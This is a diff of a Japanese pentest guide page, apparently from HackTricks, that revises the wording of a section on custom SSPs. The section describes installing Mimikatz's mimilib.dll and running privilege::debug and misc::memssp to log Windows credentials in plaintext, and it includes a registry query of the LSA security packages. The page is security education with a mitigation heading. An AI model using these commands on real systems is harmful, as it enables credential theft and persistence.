@@ -5,13 +5,13 @@
 ### カスタム SSP
 
 [SSP (セキュリティサポートプロバイダー) についてはこちらで学んでください。](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
-自分の**SSP**を作成して、**クリアテキスト**で**資格情報**を**キャプチャ**することができます。
+**自分の SSP** を作成して、マシンにアクセスするために使用される **資格情報** を **平文** で **キャプチャ** できます。
 
 #### Mimilib
 
-Mimikatzによって提供される`mimilib.dll`バイナリを使用できます。**これにより、すべての資格情報がクリアテキストでファイルにログされます。**\
-dllを`C:\Windows\System32\`に配置します。\
-既存のLSAセキュリティパッケージのリストを取得します：
+Mimikatz によって提供される `mimilib.dll` バイナリを使用できます。**これにより、すべての資格情報が平文でファイルにログされます。**\
+dll を `C:\Windows\System32\` に配置します。\
+既存の LSA セキュリティパッケージのリストを取得します：
 ```bash:attacker@target
 PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
 
@@ -31,7 +31,7 @@ Mimikatzを使用して、これをメモリ内に直接注入することもで
 privilege::debug
 misc::memssp
 ```
-これは再起動に耐えません。
+これは再起動では生き残りません。
 
 #### 緩和策
 
